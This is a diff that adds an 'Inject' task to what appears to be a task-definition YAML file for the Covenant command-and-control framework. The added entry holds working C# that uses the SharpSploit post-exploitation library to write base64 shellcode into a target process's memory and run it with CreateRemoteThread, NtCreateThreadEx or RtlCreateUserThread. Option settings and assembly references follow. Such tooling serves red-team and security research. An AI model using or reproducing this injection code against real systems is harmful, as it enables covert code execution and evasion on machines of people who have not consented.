@@ -1053,3 +1053,215 @@
     EmbeddedResources: []
   ReferenceAssemblies: []
   EmbeddedResources: []
+- Name: Inject
+  Aliases: []
+  Description: Injects a payload into a process using a specified payload type, allocation technique, and execution technique.
+  Author:
+    Name: TheWover, Simone Salucci, Daniel López, Ryan Cobb
+    Handle: '@TheRealWover @saim1z @attl4s @cobbr_io'
+    Link: ''
+  Help: 
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net40
+  Code: |
+    using System;
+    using System.Linq;
+    using System.Diagnostics;
+    using SharpSploit.Execution;
+    using SharpSploit.Execution.Injection;
+    
+    public static class Task
+    {
+        public static string Execute(string Payload, string ProcessID, string AllocationTechnique = "VirtualAlloc", string ExecutionTechnique = "CreateRemoteThread", string PayloadType = "PICPayload")
+        {
+            try
+            {
+                if (!Enum.GetNames(typeof(RemoteThreadCreate.APIS)).Any(x => x.ToLower() == ExecutionTechnique.ToLower()))
+                {
+                    return $"Execution technique: {ExecutionTechnique} is not implemented. Available techniques: CreateRemoteThread, NtCreateThreadEx, RtlCreateUserThread";
+                }
+                RemoteThreadCreate.APIS apiTechnique = (RemoteThreadCreate.APIS) Enum.Parse(typeof(RemoteThreadCreate.APIS), ExecutionTechnique, true);
+
+                if (!int.TryParse(ProcessID, out int ProcID))
+                {
+                    return $"Provided ProcessID: {ProcessID} is inavlid. Please specify a valid ProcessID";
+                }                
+                Process proc = ProcID == 0 ? Process.GetCurrentProcess() : Process.GetProcessById(ProcID);
+                
+                ExecutionTechnique executionTechnique = new RemoteThreadCreate
+                {
+                    api = apiTechnique,
+                    suspended = false
+                };
+            
+                AllocationTechnique allocationTechnique = null;
+                if (AllocationTechnique.ToLower() == "virtualalloc")
+                {
+                    allocationTechnique = new VirtualAllocAllocationTechnique(
+                        Win32.Kernel32.AllocationType.Commit | Win32.Kernel32.AllocationType.Reserve,
+                        Win32.Kernel32.MemoryProtection.ExecuteReadWrite,
+                        VirtualAllocAllocationTechnique.AllocationAPI.NtAllocateVirtualMemory,
+                        VirtualAllocAllocationTechnique.WriteAPI.NtWriteVirtualMemory
+                    );
+                }
+                else if (AllocationTechnique.ToLower() == "sectionmapalloc")
+                {
+                    allocationTechnique = new SectionMapAllocationTechnique
+                    {
+                        localSectionPermissions = Win32.WinNT.PAGE_READWRITE,
+                        remoteSectionPermissions = Win32.WinNT.PAGE_EXECUTE_READWRITE,
+                        sectionAttributes = Win32.WinNT.SEC_COMMIT
+                    };
+                }
+                else
+                {
+                    return $"Allocation technique: {AllocationTechnique} is not implemented. Available techniques: VirtualAlloc, SectionMapAlloc";
+                }
+
+                PayloadType payloadType = null;
+                if (PayloadType.ToLower() == "picpayload")
+                {
+                    payloadType = new PICPayload(Convert.FromBase64String(Payload));
+                }
+                else
+                {
+                    return $"Payload type: {PayloadType} is not implemented. Available types: PICPayload";
+                }
+      
+                Injector.Inject(payloadType, allocationTechnique, executionTechnique, proc);
+                
+                return $"Successfully injected payload into process: {proc.ProcessName} with PID: {ProcID}";
+            }
+            catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
+        }
+    }
+  TaskingType: Assembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options:
+  - Name: Payload
+    Value: ''
+    DefaultValue: ''
+    Description: Payload to inject into the target process, corresponding to the specified PayloadType.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: false
+    FileOption: true
+  - Name: ProcessID
+    Value: ''
+    DefaultValue: ''
+    Description: Process ID of the process to inject into.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  - Name: AllocationTechnique
+    Value: ''
+    DefaultValue: 'VirtualAlloc'
+    Description: The technique used to allocate memory into the process.
+    SuggestedValues:
+    - VirtualAlloc
+    - SectionMapAlloc
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
+  - Name: ExecutionTechnique
+    Value: ''
+    DefaultValue: 'CreateRemoteThread'
+    Description: The technique used to trigger execution of the payload.
+    SuggestedValues:
+    - CreateRemoteThread
+    - NtCreateThreadEx
+    - RtlCreateUserThread
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
+  - Name: PayloadType
+    Value: ''
+    DefaultValue: 'PICPayload'
+    Description: The payload type of the payload.
+    SuggestedValues:
+    - PICPayload
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
+  ReferenceSourceLibraries:
+  - Name: SharpSploit
+    Description: SharpSploit is a library for C# post-exploitation modules.
+    Location: SharpSploit\SharpSploit\
+    Language: CSharp
+    CompatibleDotNetVersions:
+    - Net35
+    - Net40
+    ReferenceAssemblies:
+    - Name: System.Core.dll
+      Location: net40\System.Core.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.dll
+      Location: net40\System.DirectoryServices.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net40\System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net40
+    - Name: System.dll
+      Location: net40\System.dll
+      DotNetVersion: Net40
+    - Name: System.IdentityModel.dll
+      Location: net40\System.IdentityModel.dll
+      DotNetVersion: Net40
+    - Name: System.Management.Automation.dll
+      Location: net40\System.Management.Automation.dll
+      DotNetVersion: Net40
+    - Name: System.Management.dll
+      Location: net40\System.Management.dll
+      DotNetVersion: Net40
+    - Name: System.ServiceProcess.dll
+      Location: net40\System.ServiceProcess.dll
+      DotNetVersion: Net40
+    - Name: mscorlib.dll
+      Location: net40\mscorlib.dll
+      DotNetVersion: Net40
+    - Name: System.XML.dll
+      Location: net35\System.XML.dll
+      DotNetVersion: Net35
+    - Name: System.Windows.Forms.dll
+      Location: net35\System.Windows.Forms.dll
+      DotNetVersion: Net35
+    - Name: System.dll
+      Location: net35\System.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net35\System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.dll
+      Location: net35\System.DirectoryServices.dll
+      DotNetVersion: Net35
+    - Name: System.Core.dll
+      Location: net35\System.Core.dll
+      DotNetVersion: Net35
+    - Name: mscorlib.dll
+      Location: net35\mscorlib.dll
+      DotNetVersion: Net35
+    - Name: System.IdentityModel.dll
+      Location: net35\System.IdentityModel.dll
+      DotNetVersion: Net35
+    - Name: System.Management.Automation.dll
+      Location: net35\System.Management.Automation.dll
+      DotNetVersion: Net35
+    - Name: System.Management.dll
+      Location: net35\System.Management.dll
+      DotNetVersion: Net35
+    - Name: System.ServiceProcess.dll
+      Location: net35\System.ServiceProcess.dll
+      DotNetVersion: Net35
+    - Name: System.Windows.Forms.dll
+      Location: net40\System.Windows.Forms.dll
+      DotNetVersion: Net40
+    - Name: System.XML.dll
+      Location: net40\System.XML.dll
+      DotNetVersion: Net40
+    EmbeddedResources: []
+  ReferenceAssemblies: []
+  EmbeddedResources: []
